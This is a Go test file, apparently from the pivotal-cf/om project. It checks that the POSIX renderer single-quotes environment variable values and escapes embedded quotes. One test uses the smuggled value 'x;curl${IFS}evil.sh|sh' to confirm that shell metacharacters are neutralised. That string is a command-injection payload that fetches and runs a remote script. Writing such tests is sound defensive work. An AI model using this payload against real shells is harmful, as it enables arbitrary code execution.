package renderers_test

import (
	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	"github.com/pivotal-cf/om/renderers"
)

var _ = Describe(renderers.ShellTypePosix, func() {
	var (
		renderer renderers.Renderer
	)

	BeforeEach(func() {
		renderer = renderers.NewPosix()
	})

	Describe("RenderEnvironmentVariable", func() {
		Context("WhenSingleLine", func() {
			It("prints env statement properly", func() {
				key := "KEY"
				value := "value"
				result := renderer.RenderEnvironmentVariable(key, value)
				Expect(result).To(Equal("export KEY='value'"))
			})
			It("shell-quotes values containing shell metacharacters", func() {
				key := "BOSH_CLIENT_SECRET"
				value := "x;curl${IFS}evil.sh|sh"
				result := renderer.RenderEnvironmentVariable(key, value)
				Expect(result).To(Equal("export BOSH_CLIENT_SECRET='x;curl${IFS}evil.sh|sh'"))
			})
			It("escapes embedded single quotes instead of breaking out of the quoted string", func() {
				key := "KEY"
				value := "it's a test"
				result := renderer.RenderEnvironmentVariable(key, value)
				Expect(result).To(Equal(`export KEY='it'\''s a test'`))
			})
		})
		Context("WhenMultiLine", func() {
			It("prints env statement with enclosing quotes", func() {
				key := "KEY"
				value := "1\n2\n3\n4\n"
				result := renderer.RenderEnvironmentVariable(key, value)
				Expect(result).To(Equal("export KEY='1\n2\n3\n4\n'"))
			})
			It("appends newline if not present", func() {
				key := "KEY"
				value := "1\n2\n3\n4"
				result := renderer.RenderEnvironmentVariable(key, value)
				Expect(result).To(Equal("export KEY='1\n2\n3\n4\n'"))
			})
		})
	})

	Describe("Type", func() {
		It("is posix", func() {
			shellType := renderer.Type()
			Expect(shellType).To(Equal(renderers.ShellTypePosix))
		})
	})
})
